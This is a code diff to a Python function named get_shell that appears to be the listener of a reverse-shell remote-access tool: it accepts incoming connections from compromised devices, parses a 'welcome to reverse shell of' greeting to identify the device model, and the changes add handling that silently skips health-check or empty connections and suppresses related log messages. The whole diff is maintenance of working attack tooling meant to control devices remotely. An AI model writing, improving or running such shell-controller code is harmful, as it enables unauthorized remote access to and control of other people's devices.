@@ -1096,6 +1096,7 @@ def get_shell(ip,port):
             continue
         
         # Successfully acquired lock, handle this connection
+        skip_connection = False  # Flag to skip health check connections
         try:
             active_connection = conn
             conn.settimeout(30.0)  # 30 second timeout
@@ -1112,6 +1113,12 @@ def get_shell(ip,port):
                 conn.settimeout(5.0)  # Short timeout for welcome message
                 welcome_data = conn.recv(1024).decode("UTF-8")
                 
+                # Check if this is a health check (empty connection or immediate close)
+                if not welcome_data or len(welcome_data) == 0:
+                    print(stdOutput("info")+"Health check or empty connection detected, ignoring...")
+                    skip_connection = True
+                    raise ConnectionResetError("Health check connection")
+                
                 if "welcome to reverse shell of" in welcome_data:
                     # Extract device model from welcome message
                     model_part = welcome_data.split("welcome to reverse shell of")[1].strip()
@@ -1127,8 +1134,20 @@ def get_shell(ip,port):
                     print(stdOutput("info")+f"Device identified: {model_part.strip()}")
                     welcome_msg = welcome_data
                     
+            except (ConnectionResetError, BrokenPipeError, OSError) as e:
+                # Connection closed before sending data - likely a health check
+                if not skip_connection:
+                    print(stdOutput("info")+f"Connection closed immediately (health check?): {e}")
+                skip_connection = True
+                raise  # Re-raise to be caught by outer handler
+            except socket.timeout as e:
+                # Timeout waiting for welcome message
+                print(stdOutput("info")+f"Timeout waiting for welcome message (health check?): {e}")
+                skip_connection = True
+                raise
             except Exception as e:
                 print(stdOutput("warning")+f"Could not read welcome message: {e}")
+                # Continue with fallback identifier
             
             # Fallback naming with IP and date for uniqueness
             if not device_identifier:
@@ -1260,7 +1279,11 @@ def get_shell(ip,port):
                     sys.exit(0)
                     
         except (ConnectionResetError, BrokenPipeError, OSError) as e:
-            print(stdOutput("warning")+f"Connection error: {e}")
+            if not skip_connection:
+                print(stdOutput("warning")+f"Connection error: {e}")
+        except socket.timeout:
+            # Timeout is already handled above
+            pass
         except KeyboardInterrupt:
             print("\n" + stdOutput("info")+"Shutting down...")
             try:
@@ -1277,8 +1300,9 @@ def get_shell(ip,port):
                 conn.close()
             except:
                 pass
-            print(stdOutput("info")+"Connection closed. Waiting for reconnection...")
-            print(" ")
+            if not skip_connection:
+                print(stdOutput("info")+"Connection closed. Waiting for reconnection...")
+                print(" ")
 
 
 def connection_checker(socket,queue):
